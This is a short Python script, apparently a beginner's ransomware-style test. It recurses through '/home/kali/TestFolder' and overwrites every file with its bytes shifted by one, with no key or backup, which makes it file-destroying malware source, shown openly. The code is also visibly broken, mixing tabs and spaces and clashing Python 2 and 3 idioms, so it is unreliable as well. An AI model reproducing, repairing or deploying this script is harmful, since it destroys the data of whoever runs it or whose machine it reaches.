import sys
import os

def EncryptLinux(currPath):
	arr = os.listdir(currPath)
	#print(arr)
	for i in arr:
		print(i)
		path = currPath+"/"+str(i)
		if(os.path.isfile(path)):
			print("found file {0}".format(path))
			#print("Its a file {0}".format(i))
			curruptIt(path)
		if(os.path.isdir(path)):
			EncryptLinux(path)
			#print("_____________________________________")
		path = currPath


def curruptIt(f):
	print("currupting")
        with open(f, 'rb') as file:
		original = file.read()
        print(original)
#           print(bytearray(original))

        value =0
#       print(original)
        newStr = ""
        for i in original:
#               print(i);
                value = i+1
#               print(value);
                newStr = newStr+str(chr(value))
#               print("===========")
        print(newStr)
        b = bytes(newStr, 'utf-8')
	print("gaurav")
        with open(f, 'wb') as encrypted_file:
                encrypted_file.write(b)
#	print("gaurav:")




name = str(sys.platform)
print(name)
if(name=="linux2"):
	EncryptLinux("/home/kali/TestFolder")
